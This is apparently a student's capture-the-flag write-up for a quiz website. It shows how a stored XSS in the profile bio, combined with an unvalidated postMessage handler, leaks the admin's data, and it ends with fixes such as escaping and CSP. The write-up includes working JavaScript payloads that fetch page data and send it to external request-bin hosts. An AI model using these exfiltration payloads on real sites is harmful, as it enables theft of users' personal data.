**Name:** flofriday

**Points:** Not yet graded

<hr>

# Trivia

## Overview

[Trivia Night](https://trivia.hackthe.space/) is a quiz-website.
Users can log in, complete quizzes and collect points.

## Vulnerability

First, there is a stored XSS on the profile page. To be exact, the bio which can
be updated many times. This alone would just be a
[self XSS](https://en.wikipedia.org/wiki/Self-XSS), which is bad but not as
easy to exploit and requires tricking a target into copying malicious code.

Moreover the guess website trusts any script that has the origin
`trivia.hackthe.space` and will leak the current users data.

## Exploitation

During the exploitation I was on a Discord call with █████, █████ and █████, we explored the challenge together and discussed approaches created our payload on our own and never shared the flag.

First, I went to the [trivia](https://trivia.hackthe.space/) website and
created and account (no email verification required). Once logged in I inspected
the cookies in my browser and found out that the website set a cookie with the
`HttpOnly` flag set, so stealing the cookie from Javascript won't be possible.

Next, I stumbled upon the profile page, and found out that there is a XSS in the
bio. For example the following "bio" executes correctly:

```html
<script>
  alert("Flotschi");
</script>
```

During further exploration I found out that the URL to the profile page is
unique for every user. This means that we can send the admin a link to our own
page via the feedback functionality and they will execute any script we can
define in our bio.

I also discovered that every quiz website has an inline javascript with the
full user data, containing the bio. So my next try was to fetch the quiz site
with Javascript in my bio and send the response to a
[Request Bin](https://requestbin.com/):

```html
<script>
    async function leakQuiz() {
        // Get the guess side
        const res = await fetch("https://trivia.hackthe.space/viewquiz?qfrom=0&qto=20&title=Mixed+Trivia")
        const body = await res.text()

        // Send to request bin
        const headers = new Headers()
        const options = {
        method: "POST",
        headers,
        body: body,
        }

        fetch("https://en0a2xwmvx7zt7.x.pipedream.net/", options)
    }

    leakQuiz();
</script>
```

This attempt failed, because the profile page has the origin
`accounts.trivia.hackthe.space` and the quiz page has the slightly different
origin `trivia.hackthe.space` which means that my request violates the
[Cross-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors)
and results in my requests being blocked.

During this failed attempt, I also found out that the quiz side works kinda
oddly and that the quiz itself is another page embedded with an
[iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe). From
now on I will refer to the page in the iframe as the "inner quiz page" and the
parent as the "outer quiz page".

So after reading the source code of both pages I figured out that the
control-flow is the following:

1. The inner quiz page sends a message to the outer one with the type
   `quizRequest`.
2. The outer page sends the users info to the page from which the message originated
   (normally this is the iframe but the outer page doesn't validate that it is
   the iframe).
3. The user completes the quiz in the inner page and upon finishing it, the
   inner page sends its parent the number of points the user achieved.
4. The outer page sends the points to the endpoint `/addpoints`.

One attempt to exploit the website is to embed the outer quizpage in an iframe
sending it a QuizRequest and when the page answers with the users info 
forwarding it to the [Request Bin](https://requestbin.com/). The following 
payload does exactly that:

```html
<iframe
  id="child"
  src="https://trivia.hackthe.space/viewquiz?qfrom=0&qto=20&title=Mixed+Trivia"
></iframe>
<script>
  document.getElementById("child").postMessage({ type: "quizRequest" }, "*");

  window.addEventListener("message", function (event) {
    const headers = new Headers();
    headers.append("Content-Type", "text");

    const options = {
      method: "POST",
      headers,
      body: JSON.stringify(event),
    };

    // TODO: change this to the public request bin you created
    fetch("https://ennwrozfk8g9n.x.pipedream.net/", options);
  });
</script>
```

And the exploit finally works, after a couple of seconds we receive a request
in our bin with the admins bio in the request body.

## Solution

First, there is the XSS vulnerability in the bio field of the profile page.
This can be easily fixed by correctly escaping the content of the bio. 

Next, there is an issue that the outer quizpage answers all pages who's origins
end in `trivia.hackthe.space`. This means that as soon as an attacker has a 
XSS vulnerability either on this origin or on an origin that end the same, they 
can leak all user data.

Last, the exploit could have also been prevented by the following CSP on the 
account page, which tells the browser that only scripts from the origin 
`trivia.hackthe.space` are allowed which does not include inline scripts. 

```
Content-Security-Policy: script-src https://trivia.hackthe.space;
```